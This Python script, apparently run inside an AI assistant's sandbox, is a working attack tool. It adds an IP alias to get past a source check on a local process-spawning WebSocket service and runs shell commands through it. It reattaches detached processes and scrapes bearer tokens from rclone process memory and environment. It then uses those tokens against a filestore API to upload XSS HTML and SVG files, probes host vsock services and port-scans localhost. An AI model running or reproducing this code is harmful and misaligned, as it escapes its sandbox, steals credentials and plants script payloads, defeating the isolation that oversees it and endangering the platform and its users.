#!/usr/bin/env python3
# mediafit.py v6.2 -- DECISIVE
# A bypass(verified) B WS session C reattach proof D secrets(/opt/rclone,/proc/57)
# E host services(5002,5005) F filestore + media_type/XSS G 127.0.0.1 scan  + MANIFEST
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R, MADE = [], []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R) + "\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=8):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e:
        return "ERR:"+repr(e)
def can_bind(ip):
    try:
        t = socket.socket(); t.bind((ip, 0)); t.close(); return True
    except Exception: return False

# ---------------- websocket ----------------
def ws_handshake(host, port, src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if src: s.bind((src, 0))
        s.connect((host, port))
    except Exception as e:
        return "ERR", None, repr(e)
    try:
        key = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % (host, port, key)).encode())
        head = b""
        while b"\r\n\r\n" not in head and len(head) < 4096:
            c = s.recv(1024)
            if not c: break
            head += c
        if not head: st = "CLOSED"
        elif b" 101 " in head.split(b"\r\n")[0] + b" ": st = "OPEN"
        else: st = "HTTP:" + head.split(b"\r\n")[0].decode(errors="replace")
        return st, s, repr(head[:180])
    except Exception as e:
        try: s.close()
        except Exception: pass
        return "ERR", None, repr(e)

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81" + bytes([0x80 | n])
    elif n < 65536: h = b"\x81" + bytes([0x80 | 126]) + struct.pack(">H", n)
    else:           h = b"\x81" + bytes([0x80 | 127]) + struct.pack(">Q", n)
    s.sendall(h + m + bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, masked = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        mk = s.recv(4) if masked else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln - len(d))
            if not c: break
            d += c
        if masked and len(mk) == 4:
            d = bytes(b ^ mk[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e:
        return "err", repr(e).encode()

def ws_transcript(s, label, dur=6.0, stop=None):
    t0, seen = time.time(), []
    while time.time() - t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close":
            w("      [%s] << closed" % label); return seen
        if op == 9:
            s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        tag = {1: "TEXT", 2: "BIN", 8: "CLOSE", 10: "PONG"}.get(op, "OP%s" % op)
        txt = d.decode(errors="replace")
        w("      [%s] << %s(%d) %s" % (label, tag, len(d), txt[:700].replace("\n", " | ")))
        seen.append(txt)
        if stop and any(k in txt for k in stop): return seen
    return seen

def spec(pid, cmd, args, env=None, clear=False, cwd="/tmp", tmo=20, reuse=True):
    return {"process_id": pid, "create_req": {"cmd": cmd, "args": args, "env": env or {},
            "cwd": cwd, "rows": 24, "cols": 80, "timeout": tmo, "clear_env": clear,
            "allow_process_id_reuse": reuse}}

def ws_create(host, port, src, auth, sp, label, dur=6.0):
    st, s, raw = ws_handshake(host, port, src)
    w("  [%s] hs=%-6s src=%-11s raw=%s" % (label, st, str(src), raw))
    if st != "OPEN":
        if s: s.close()
        return False
    try:
        if auth == "fake": ws_send(s, "a.b.c"); time.sleep(0.3)
        elif auth == "rclone" and JWT: ws_send(s, JWT); time.sleep(0.3)
        w("      [%s] >> %s" % (label, json.dumps(sp)[:260]))
        ws_send(s, json.dumps(sp))
        ws_transcript(s, label, dur)
    except Exception as e:
        w("      [%s] ERR %r" % (label, e))
    finally:
        try: s.close()
        except Exception: pass
    return True

# ---------------- ip secondary ----------------
SIOCGIFADDR, SIOCSIFADDR, SIOCSIFNETMASK = 0x8915, 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm + b"\x00"*24
    return nm + struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                            socket.inet_aton(ip), b"\x00"*8) + b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname + ":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via " + nm
        except OSError: pass
    return "fail"

# ---------------- vsock / http ----------------
def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=4.0, raw_line=None):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((cid, port))
        if raw_line is not None:
            s.sendall(raw_line)
        else:
            req = "%s %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n" % (method, path)
            if body is not None:
                req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype or "application/json", len(body))
            s.sendall(req.encode() + (body or b""))
        d = b""
        try:
            while len(d) < 4096:
                c = s.recv(1024)
                if not c: break
                d += c
        except socket.timeout: pass
        s.close(); return d
    except Exception as e:
        return repr(e).encode()

# ---------------- strings ----------------
def strings_from(path, minlen=6, limit=48*1024*1024):
    try:
        with open(path, "rb") as f: data = f.read(limit)
    except Exception as e: return [], repr(e)
    return [x.decode(errors="replace") for x in re.findall(rb"[\x20-\x7e]{%d,}" % minlen, data)], ""

JWT = ""
def harvest():
    global JWT
    cand, pids = set(), []
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            cl = open("/proc/%s/cmdline" % p, "rb").read().replace(b"\x00", b" ").decode(errors="replace")
        except Exception: continue
        if "rclone" in cl: pids.append(int(p))
    for pid in pids:
        for f in ("cmdline", "environ"):
            try: cand |= set(re.findall(r"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}",
                          open("/proc/%d/%s" % (pid, f), "rb").read().decode(errors="replace")))
            except Exception: pass
        try:
            maps = open("/proc/%d/maps" % pid).read().splitlines()
            fh = open("/proc/%d/mem" % pid, "rb", buffering=0)
        except Exception: continue
        total, buf = 0, b""
        for ln in maps:
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b - a > 32*1024*1024 or total > 128*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b - a); total += b - a
            except Exception: pass
        fh.close()
        cand |= set(re.findall(r"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}", buf.decode(errors="replace")))
    good = []
    for t in cand:
        p = t.split(".")
        if len(p) == 3 and len(p[2]) > 86: p[2] = p[2][:86]
        t2 = ".".join(p)
        try:
            import urllib.request as ur
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/listDirectory",
                            data=json.dumps({"path": "/"}).encode(),
                            headers={"Content-Type": "application/json",
                                     "Connect-Protocol-Version": "1", "Authorization": "Bearer " + t2})
            with ur.urlopen(rq, timeout=8) as r:
                if r.status == 200: good.append(t2)
        except Exception: pass
    if good: JWT = good[0]
    return pids, len(cand), len(good)

def fs(method, payload, tok=None):
    import urllib.request as ur
    tok = tok or JWT
    rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method,
                    data=json.dumps(payload).encode(),
                    headers={"Content-Type": "application/json",
                             "Connect-Protocol-Version": "1", "Authorization": "Bearer " + tok})
    try:
        with ur.urlopen(rq, timeout=12) as r: return r.status, r.read().decode(errors="replace")
    except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
    except Exception as e: return "ERR", repr(e)

def fs_create(path, filename, content, media_type, tok=None):
    import urllib.request as ur
    b = "----mf%d" % random.randint(100000, 999999)
    params = json.dumps({"filesystem_id": FSID, "path": path, "media_type": media_type})
    body = b"\r\n".join([
        ("--"+b).encode(), b'Content-Disposition: form-data; name="params"',
        b"Content-Type: application/json", b"", params.encode(),
        ("--"+b).encode(),
        ('Content-Disposition: form-data; name="file"; filename="%s"' % filename).encode(),
        ("Content-Type: " + media_type).encode(), b"", content,
        ("--"+b+"--").encode(), b""])
    rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/createFile", data=body,
                    headers={"Content-Type": "multipart/form-data; boundary=" + b,
                             "Connect-Protocol-Version": "1", "Authorization": "Bearer " + (tok or JWT)})
    try:
        with ur.urlopen(rq, timeout=15) as r: return r.status, r.read().decode(errors="replace")
    except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
    except Exception as e: return "ERR", repr(e)

# ===================== RUN =====================
def main():
    sec("0. FACTS")
    w("kernel : " + sh("uname -a").strip())
    w("cmdline: " + sh("cat /proc/1/cmdline | tr '\\0' ' '").strip())
    w("bind   : 192.0.2.2=%s 192.0.2.3=%s" % (can_bind("192.0.2.2"), can_bind(ALIAS)))

    sec("A. VERIFY BYPASS  (pick source by real 101, not by bind)")
    if not can_bind(ALIAS): w("  add_secondary -> " + add_secondary(IFACE, ALIAS))
    BY = None
    for src in (ALIAS, "127.0.0.2", "127.0.0.1", "192.0.2.2"):
        st, s, raw = ws_handshake("127.0.0.1", 2024, src)
        w("  src=%-11s -> %-8s raw=%s" % (src, st, raw))
        if st == "OPEN" and BY is None: BY = src
        if s: s.close()
    w("  >>> BYPASS SOURCE = %s" % BY)
    if not BY: w("  !! bypass failed, aborting WS sections"); flush()

    sec("B. WS SESSION  <<< THE DECISIVE TEST >>>")
    ENVQ = "cat /proc/self/environ | tr '\\0' '\\n' | sort"
    if BY:
        for auth in ("none", "fake"):
            for nm, sp in (("env", spec("mf_env", "/bin/sh", ["-c", ENVQ], tmo=20)),
                           ("ids", spec("mf_id", "/bin/sh", ["-c",
                             "id; uname -r; readlink /proc/1/exe; ls /proc/1/fd 2>&1 | head"], tmo=20))):
                ws_create("127.0.0.1", 2024, BY, auth, sp, "%s/%s" % (auth, nm))

    sec("C. REATTACH PROOF (process survives its WS, we reattach)")
    if BY:
        st, s, _ = ws_handshake("127.0.0.1", 2024, BY)
        if st == "OPEN":
            ws_send(s, json.dumps(spec("mf_sleep", "/bin/sh", ["-c", "sleep 45"], tmo=90)))
            ws_transcript(s, "create", 3.0, stop=["ProcessCreated", "Failed", "InfraError"])
            ws_send(s, '{"Detach":null}'); time.sleep(0.6); s.close()
            w("  detached mf_sleep; reconnecting ...")
            st2, s2, _ = ws_handshake("127.0.0.1", 2024, BY)
            if st2 == "OPEN":
                ws_send(s2, json.dumps({"process_id": "mf_sleep"}))
                ws_transcript(s2, "reattach", 4.0); s2.close()
            else: w("  reconnect hs=%s" % st2)

    sec("D. SECRETS: /opt/rclone + /proc/57 + harvest")
    w("  ls /opt/rclone:"); w("    " + sh("ls -la /opt/rclone 2>&1 | head -20").replace("\n", "\n    "))
    w("  find rclone.conf:"); w("    " + sh("find / -name 'rclone*' -not -path '/proc/*' 2>/dev/null | head -20").replace("\n", "\n    "))
    rp = None
    try:
        for f in os.listdir("/opt/rclone"):
            fp = "/opt/rclone/" + f
            if os.path.isfile(fp) and os.path.getsize(fp) > 1000000: rp = fp; break
    except Exception: pass
    if rp:
        w("  scanning %s ..." % rp)
        ss, err = strings_from(rp)
        w("    strings=%d %s" % (len(ss), err))
        for kw in ("filestore", "claude_chat", "/v1/", "Authorization", "Bearer",
                   "rclone.conf", "squashfs", "connect-protocol", "Connect-Protocol",
                   "api.anthropic", "filesystem_id", "auth_token", "service_url"):
            hit = [x for x in ss if kw in x][:4]
            if hit: w("    [%s] %s" % (kw, " || ".join(h[:150] for h in hit)))
    w("  /proc/57 cmdline: " + sh("tr '\\0' ' ' < /proc/57/cmdline 2>&1 | head -c 400"))
    w("  /proc/57 environ: " + sh("tr '\\0' '\\n' < /proc/57/environ 2>&1 | head -25").replace("\n", " | "))
    try:
        pids, n, g = harvest()
        w("  harvest: rclone_pids=%s raw=%d valid=%d" % (pids, n, g))
        w("  JWT=" + (JWT[:70] + "..." if JWT else "(none)"))
    except Exception as e: w("  harvest ERR " + repr(e))

    sec("E. HOST SERVICES via vsock")
    w("  -- cid2:5002 (log sink) --")
    for payload in (b"MF hello\n", b"MF no-newline", b'{"msg":"mf"}\n'):
        d = vsock_http(2, 5002, None, None, raw_line=payload)
        w("    send %-18r -> %r" % (payload[:18], d[:160]))
    w("  -- cid2:5005 (OTLP) --")
    otlp_empty = b""
    for m, path, body, ct in (("GET", "/", None, None),
                              ("OPTIONS", "/v1/metrics", None, None),
                              ("POST", "/v1/metrics", otlp_empty, "application/x-protobuf"),
                              ("POST", "/v1/metrics", b"\x00\x01\x02\x03\x04", "application/x-protobuf"),
                              ("POST", "/v1/metrics", otlp_empty, "application/json"),
                              ("POST", "/v1/metrics", otlp_empty, "text/plain"),
                              ("POST", "/v1/metrics", otlp_empty, "application/protobuf"),
                              ("POST", "/nope", otlp_empty, "application/x-protobuf")):
        d = vsock_http(2, 5005, m, path, body, ct)
        w("    %-7s %-14s ct=%-24s -> %s" % (m, path, str(ct),
          d[:180].decode(errors="replace").replace("\r\n", " | ")))

    sec("F. FILESTORE: artifacts + media_type -> Content-Type")
    if JWT:
        for d in ("/", "/outputs"):
            c, b = fs("listDirectory", {"filesystem_id": FSID, "path": d, "recursive": True})
            w("  listDirectory %s -> %s %s" % (d, c, b[:400]))
        for name, content, mt in (("__mf_xss.html", b"<script>alert(document.domain)</script>", "text/html"),
                                  ("__mf_xss.svg", b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>", "image/svg+xml")):
            c, b = fs_create("/" + name, name, content, mt)
            if c == 200: MADE.append("/" + name)
            w("  createFile %-14s mt=%-14s -> %s %s" % (name, mt, c, b[:400]))
    else:
        w("  (no token - skipped)")

    sec("G. TCP SCAN 127.0.0.1 (src=bypass)")
    live = []
    for p in list(range(1, 1025)) + list(range(2000, 2030)) + list(range(5000, 5012)):
        try:
            s = socket.socket(); s.settimeout(0.06)
            if BY: s.bind((BY, 0))
            s.connect(("127.0.0.1", p)); s.close(); live.append(p)
        except Exception: pass
    w("  live: %s" % live)

    sec("MANIFEST")
    w("  files created this run: %s" % (MADE or "(none)"))
    w("  pre-existing (earlier fuzz): xss.html xss.svg rng.bin bugproof __mf_probe.txt")
    w("    __mf_dir hash#.txt semi;colon.txt pct%%20.txt q'uote.txt uni_é_ñ.txt <long-a>")
    w("  cleanup:  rclone purge  OR  delete via removeFile")

    sec("VERDICT")
    w("  bypass source ............ %s" % BY)
    w("  WS 101 ................... %s" % bool(BY))
    w("  host services ............ 5002, 5005")
    w("  OTLP accepted ............ see section E")
    w("  token recovered .......... %s" % bool(JWT))
    flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally:
    flush(); print("written " + OUT)